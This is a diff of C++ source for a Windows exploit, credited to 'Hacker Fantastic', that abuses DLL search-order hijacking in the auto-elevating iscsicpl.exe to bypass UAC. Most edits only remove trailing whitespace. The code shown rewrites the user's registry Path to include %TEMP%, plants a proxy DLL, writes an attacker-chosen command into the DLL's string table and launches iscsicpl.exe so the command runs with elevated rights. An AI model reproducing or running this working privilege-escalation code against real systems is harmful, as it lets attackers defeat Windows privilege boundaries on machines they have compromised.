@@ -2,20 +2,19 @@
 * ===========================================================
 * The iscsicpl.exe binary is vulnerable to a DLL Search Order hijacking
 * vulnerability when running 32bit Microsoft binary on a 64bit host via
-* SysWOW64. The 32bit binary, will perform a search within user %Path% 
-* for the DLL iscsiexe.dll, which does not exist. This can be exploited 
-* using a Proxy DLL to execute code via "iscsicpl.exe" as autoelevate 
-* is enabled. This exploit has been tested against the following versions
-* of Windows desktop: 
-* 
-* Windows 11 Enterprise x64 (Version 10.0.22000.739).  
+* SysWOW64. The 32bit binary, will perform a search within user %Path%
+* for the DLL iscsiexe.dll. This can be exploited using a Proxy DLL to
+* execute code via "iscsicpl.exe" as autoelevate is enabled. This exploit
+* has been tested against the following versions of Windows desktop:
+*
+* Windows 11 Enterprise x64 (Version 10.0.22000.739).
 * Windows 8.1 Professional x64 (Version 6.3.9600).
 *
 * TODO: fix the .resource compiler NDEBUG / _DEBUG preprocessor directive
 * to fix batch building.
-* 
+*
 * -- Hacker Fantastic
-* https://hacker.house 
+* https://hacker.house
 */
 #include <iostream>
 #include <vector>
@@ -39,7 +38,7 @@ using namespace std;
 #pragma comment(lib,"Shell32.lib")
 #pragma comment(lib,"Ole32.lib")
 #pragma comment(lib,"Oleaut32.lib")
-#pragma comment(lib,"ntdll.lib") 
+#pragma comment(lib,"ntdll.lib")
 #pragma comment(lib,"Secur32.lib")
 
 /* program defines for fixed size vars */
@@ -111,16 +110,16 @@ int main(int argc, char* argv[])
 		return EXIT_FAILURE;
 	}
 	// multi-byte string to wide char string to convert user command into pCMD
-	pCMDpath = new TCHAR[MAX_PATH + 1]; 
+	pCMDpath = new TCHAR[MAX_PATH + 1];
 	mbstowcs_s(&sSize, pCMDpath, MAX_PATH, argv[1], strlen(argv[1]));
 
-	// find the USER SID, to edit the user's registry hive directly to avoid permission problems.	
+	// find the USER SID, to edit the user's registry hive directly to avoid permission problems.
 	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken) == FALSE) {
 		dwErrorCode = GetLastError();
 		wprintf(L"OpenProcessToken failed. GetLastError returned: %d\n", dwErrorCode);
 		return HRESULT_FROM_WIN32(dwErrorCode);
 	}
-	// Retrieve the token information in a TOKEN_USER structure.  
+	// Retrieve the token information in a TOKEN_USER structure.
 	GetTokenInformation(hToken, TokenUser, NULL, 0, &dwBufferSize);
 	pTokenUser = (PTOKEN_USER) new BYTE[dwBufferSize];
 	memset(pTokenUser, 0, dwBufferSize);
@@ -157,7 +156,7 @@ int main(int argc, char* argv[])
 		printf("[-] RegGetValue Ret:%x\n", dwRet);
 		return dwRet;
 	};
-	// writes %TEMP% into %Path% 
+	// writes %TEMP% into %Path%
 	dwRet = RegSetValueExW(hRegKey, L"Path", NULL, REG_SZ, (BYTE*)pTmpPath, ((DWORD)wcslen(pTmpPath) * 2) + 1);
 	if (dwRet != ERROR_SUCCESS) {
 		printf("[-] RegSetValueExW Ret:%x\n", dwRet);
@@ -175,9 +174,9 @@ int main(int argc, char* argv[])
 		if (ExtractResource(IDR_DLLPROXY, pBinPatchPath))
 		{
 			// string table structure creation hack using wstring's for user command
-			wstring data[7] = { L"", L"", L"", L"", L"", (wstring)pCMDpath, L""}; 
+			wstring data[7] = { L"", L"", L"", L"", L"", (wstring)pCMDpath, L""};
 			vector< WORD > buffer;
-			for (size_t index = 0; index < sizeof(data) / sizeof(data[0]); index++) 
+			for (size_t index = 0; index < sizeof(data) / sizeof(data[0]); index++)
 			{
 				size_t pos = buffer.size();
 				buffer.resize(pos + data[index].size() + 1);
@@ -189,7 +188,7 @@ int main(int argc, char* argv[])
 			// overwrite the IDS_CMD101 string table in the payload DLL with user command.
 			bResult = UpdateResource(hPE, RT_STRING, MAKEINTRESOURCE(7), MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), reinterpret_cast<void*>(&buffer[0]),buffer.size() * sizeof(WORD));
 			bResult = EndUpdateResource(hPE,FALSE);
-			// TODO: should also really read %windir% here in case no standard path. 
+			// TODO: should also really read %windir% here in case no standard path.
 			// executes syswow64 iscsicpl correctly with the new path
 			RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
 			shinfo.cbSize = sizeof(shinfo);
